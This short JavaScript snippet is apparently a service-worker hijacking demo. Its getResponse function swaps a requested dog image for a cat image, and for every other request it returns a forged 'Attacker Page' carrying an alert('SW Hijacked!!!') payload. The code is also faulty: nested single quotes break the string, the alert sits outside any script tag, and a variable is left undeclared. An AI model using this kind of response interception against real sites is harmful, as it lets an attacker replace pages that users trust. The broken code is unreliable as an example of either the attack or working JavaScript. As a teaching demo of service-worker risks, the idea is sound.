self.getResponse = async function(url){  
  if (url == 'https://service-worker-lifecycle-demos.glitch.me/imgs/dog.svg'){
    url = 'https://service-worker-lifecycle-demos.glitch.me/imgs/cat.svg'
    response = await fetch(url)
    return response
  }
  response = new Response('<html><head>alert('SW Hijacked!!!')</head><body><h1>Attacker Page!!!</h1></body></html>');
  return response
}
